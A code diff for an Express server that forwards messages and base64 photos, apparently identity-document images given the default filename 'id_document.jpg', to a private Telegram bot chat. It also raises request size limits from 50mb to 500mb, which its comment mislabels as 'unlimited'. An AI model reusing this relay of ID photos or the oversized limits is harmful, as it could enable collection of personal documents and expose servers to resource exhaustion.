@@ -53,9 +53,9 @@ app.use((req, res, next) => {
   next();
 });
 
-// Parse JSON request bodies with increased payload limit for photo uploads
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ extended: false, limit: '50mb' }));
+// Parse JSON request bodies with unlimited payload size for photo uploads
+app.use(express.json({ limit: '500mb', parameterLimit: 100000 }));
+app.use(express.urlencoded({ extended: true, limit: '500mb', parameterLimit: 100000 }));
 
 // Log all requests
 app.use((req, res, next) => {
@@ -142,16 +142,53 @@ app.post('/api/send-telegram', async (req, res) => {
     let telegramResponse;
     
     if (photo) {
-      // Send photo message
+      // Send photo message with optimized handling for large files
       const formData = new FormData();
       formData.append('chat_id', TELEGRAM_CONFIG.authorizedChatId);
-      formData.append('photo', Buffer.from(photo.data, 'base64'), { filename: photo.filename });
+      
+      // Handle base64 photo data more efficiently
+      let photoBuffer;
+      try {
+        if (photo.data) {
+          // Remove data URL prefix if present
+          const base64Data = photo.data.replace(/^data:image\/[a-z]+;base64,/, '');
+          photoBuffer = Buffer.from(base64Data, 'base64');
+        } else {
+          // Fallback for direct buffer data
+          photoBuffer = Buffer.from(photo);
+        }
+        
+        formData.append('photo', photoBuffer, { 
+          filename: photo.filename || 'id_document.jpg',
+          contentType: 'image/jpeg'
+        });
+      } catch (bufferError) {
+        console.error('Error processing photo buffer:', bufferError);
+        // If buffer processing fails, send text message instead
+        telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CONFIG.authorizedChatId,
+            text: message + '\n\n[Note: Photo processing failed - large file size]',
+            parse_mode: 'HTML'
+          })
+        });
+        
+        const result = await telegramResponse.json();
+        console.log('Telegram API response (fallback text):', result);
+        return res.json({ success: result.ok, data: result });
+      }
+      
       formData.append('caption', message);
       formData.append('parse_mode', 'HTML');
       
       telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
         method: 'POST',
-        body: formData
+        body: formData,
+        timeout: 60000 // 60 second timeout for large files
       });
     } else {
       // Send text message
